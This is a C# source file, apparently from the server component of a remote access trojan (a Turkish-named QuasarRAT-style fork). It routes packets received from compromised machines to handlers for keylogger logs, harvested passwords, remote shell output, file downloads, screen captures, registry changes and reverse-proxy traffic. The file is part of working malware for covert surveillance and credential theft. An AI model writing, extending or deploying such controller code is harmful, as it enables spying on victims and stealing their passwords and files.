using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.Eylemler;
using xServer.KuuhakuCekirdek.Paketler.ClientPaketleri;
using xServer.KuuhakuCekirdek.ReverseProxy;
using xServer.KuuhakuCekirdek.ReverseProxy.Packets;

namespace xServer.KuuhakuCekirdek.Paketler
{
    public static class Packetİşleyicisi
    {
        public static void HandlePacket(Client client, IPacket packet)
        {
            if (client == null || client.Value == null)
                return;

            var type = packet.GetType();

            if (type == typeof(SetStatus))
            {
                Eylemİşleyicisi.HandleSetStatus(client, (SetStatus)packet);
            }
            else if (type == typeof(SetUserStatus))
            {
                Eylemİşleyicisi.HandleSetUserStatus(client, (SetUserStatus)packet);
            }
            else if (type == typeof(GetDesktopResponse))
            {
                Eylemİşleyicisi.HandleGetDesktopResponse(client, (GetDesktopResponse)packet);
            }
            else if (type == typeof(GetProcessesResponse))
            {
                Eylemİşleyicisi.HandleGetProcessesResponse(client,
                    (GetProcessesResponse)packet);
            }
            else if (type == typeof(GetDrivesResponse))
            {
                Eylemİşleyicisi.HandleGetDrivesResponse(client, (GetDrivesResponse)packet);
            }
            else if (type == typeof(GetDirectoryResponse))
            {
                Eylemİşleyicisi.HandleGetDirectoryResponse(client, (GetDirectoryResponse)packet);
            }
            else if (type == typeof(DoDownloadFileResponse))
            {
                Eylemİşleyicisi.HandleDoDownloadFileResponse(client,
                    (DoDownloadFileResponse)packet);
            }
            else if (type == typeof(GetSystemInfoResponse))
            {
                Eylemİşleyicisi.HandleGetSystemInfoResponse(client,
                    (GetSystemInfoResponse)packet);
            }
            else if (type == typeof(GetMonitorsResponse))
            {
                Eylemİşleyicisi.HandleGetMonitorsResponse(client, (GetMonitorsResponse)packet);
            }
            else if (type == typeof(DoShellExecuteResponse))
            {
                Eylemİşleyicisi.HandleDoShellExecuteResponse(client,
                    (DoShellExecuteResponse)packet);
            }
            else if (type == typeof(GetStartupItemsResponse))
            {
                Eylemİşleyicisi.HandleGetStartupItemsResponse(client,
                    (GetStartupItemsResponse)packet);
            }
            else if (type == typeof(GetKeyloggerLogsResponse))
            {
                Eylemİşleyicisi.HandleGetKeyloggerLogsResponse(client, (GetKeyloggerLogsResponse)packet);
            }
            else if (type == typeof(GetRegistryKeysResponse))
            {
                Eylemİşleyicisi.HandleLoadRegistryKey((GetRegistryKeysResponse)packet, client);
            }
            else if (type == typeof(GetCreateRegistryKeyResponse))
            {
                Eylemİşleyicisi.HandleCreateRegistryKey((GetCreateRegistryKeyResponse)packet, client);
            }
            else if (type == typeof(GetDeleteRegistryKeyResponse))
            {
                Eylemİşleyicisi.HandleDeleteRegistryKey((GetDeleteRegistryKeyResponse)packet, client);
            }
            else if (type == typeof(GetRenameRegistryKeyResponse))
            {
                Eylemİşleyicisi.HandleRenameRegistryKey((GetRenameRegistryKeyResponse)packet, client);
            }
            else if (type == typeof(GetCreateRegistryValueResponse))
            {
                Eylemİşleyicisi.HandleCreateRegistryValue((GetCreateRegistryValueResponse)packet, client);
            }
            else if (type == typeof(GetDeleteRegistryValueResponse))
            {
                Eylemİşleyicisi.HandleDeleteRegistryValue((GetDeleteRegistryValueResponse)packet, client);
            }
            else if (type == typeof(GetRenameRegistryValueResponse))
            {
                Eylemİşleyicisi.HandleRenameRegistryValue((GetRenameRegistryValueResponse)packet, client);
            }
            else if (type == typeof(GetChangeRegistryValueResponse))
            {
                Eylemİşleyicisi.HandleChangeRegistryValue((GetChangeRegistryValueResponse)packet, client);
            }
            else if (type == typeof(GetPasswordsResponse))
            {
                Eylemİşleyicisi.HandleGetPasswordsResponse(client, (GetPasswordsResponse)packet);
            }
            else if (type == typeof(SetStatusFileManager))
            {
                Eylemİşleyicisi.HandleSetStatusFileManager(client, (SetStatusFileManager)packet);
            }
            else if (type == typeof(ReverseProxyConnectResponse) ||
                     type == typeof(ReverseProxyData) ||
                     type == typeof(ReverseProxyDisconnect))
            {
                ReverseProxyCommandHandler.HandleCommand(client, packet);
            }
        }
    }
}